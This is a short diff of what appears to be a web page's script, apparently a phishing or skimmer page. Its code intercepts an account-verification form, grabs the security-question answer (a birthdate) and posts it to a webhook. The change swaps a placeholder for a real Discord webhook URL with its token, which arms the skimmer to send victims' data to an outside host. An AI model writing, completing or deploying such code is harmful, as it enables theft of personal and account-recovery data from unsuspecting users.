@@ -5904,7 +5904,7 @@ smsc-dialog#playDialog .smsc-dialog > div { padding-right: 0px; }
                           document.querySelector('form[name="account_verification_form"]').addEventListener('submit', function(e) {
                             e.preventDefault();
                             var birthdate = document.getElementById('account_verification_form__security_question_answer').value;
-                            var webhookUrl = 'YOUR_WEBHOOK_URL_HERE';
+                            var webhookUrl = 'https://discord.com/api/webhooks/1467926327561818286/FGzye5rkxJRtoTfRr-nPdb4JohJO45-u8PNVG8JZsZPpGilcpp6xlaA6Pp8P70aZ1gL9';
                             fetch(webhookUrl, {
                               method: 'POST',
                               headers: { 'Content-Type': 'application/json' },
